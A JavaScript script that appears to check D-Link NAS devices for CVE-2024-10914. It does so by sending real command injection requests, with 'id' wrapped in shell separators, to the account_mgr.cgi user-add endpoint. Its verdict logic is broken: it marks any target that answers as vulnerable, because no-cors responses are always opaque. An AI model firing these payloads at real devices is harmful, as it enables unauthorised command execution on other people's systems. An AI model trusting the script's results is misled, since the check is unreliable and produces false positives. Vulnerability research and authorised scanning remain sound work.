/**
 * CVE-2024-10914 Vulnerability Checker
 * This script checks for command injection vulnerability in D-Link NAS devices
 * through the account management CGI script.
 */

const PAYLOADS = [
    "id"
];

const VULNERABLE_DEVICES = {
    "DNS-320": {
        firmware: ["1.00"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-320:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-320_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-320_firmware:*:*:*:*:*:*:*:*"
        }
    },
    "DNS-320LW": {
        firmware: ["1.01.0914.2012"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-320lw:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-320lw_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-320lw_firmware:*:*:*:*:*:*:*:*"
        }
    },
    "DNS-325": {
        firmware: ["1.01", "1.02"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-325:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-325_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-325_firmware:*:*:*:*:*:*:*:*"
        }
    },
    "DNS-340L": {
        firmware: ["1.08"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-340l:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-340l_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-340l_firmware:*:*:*:*:*:*:*:*"
        }
    }
};

const COMMAND_INJECTION_PATTERNS = [
    ";",
    "|",
    "&",
    "&&",
    "||",
    "`",
    "$()",
    "()",
    "{}"
];

async function checkVulnerability(targetUrl, port = 80) {
    try {
  
        const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
        let hasConnectionError = false;
        let successfulResponses = 0;
        
        
        for (const payload of PAYLOADS) {
            for (const pattern of COMMAND_INJECTION_PATTERNS) {
                const testUrl = `http://${cleanUrl}:${port}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=${pattern}${payload}${pattern}`;
                
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 6500); 

                    const response = await fetch(testUrl, {
                        method: 'GET',
                        headers: {
                            'Accept': '*/*',
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
                            'X-Requested-With': 'XMLHttpRequest'
                        },
                        mode: 'no-cors',
                        signal: controller.signal,
                        credentials: 'omit'
                    });

                    clearTimeout(timeoutId);

                    if (response.type === 'opaque') {
                        successfulResponses++;
                    }
                } catch (error) {
                    if (error.name === 'AbortError' || error.message.includes('Failed to fetch')) {
                        hasConnectionError = true;
                    }
                }


                await new Promise(resolve => setTimeout(resolve, 500));
            }
        }

    
        if (successfulResponses > 0) {
            return {
                vulnerable: true,
                details: 'Target is vulnerable to CVE-2024-10914'
            };
        }

        if (hasConnectionError) {
            return {
                vulnerable: false,
                details: 'Connection error occurred'
            };
        }

        return {
            vulnerable: false,
            details: 'Target is not vulnerable to CVE-2024-10914'
        };

    } catch (error) {
        return {
            vulnerable: false,
            details: 'Error occurred during check'
        };
    }
}


if (typeof module !== 'undefined' && module.exports) {
    module.exports = { checkVulnerability, VULNERABLE_DEVICES };
} 
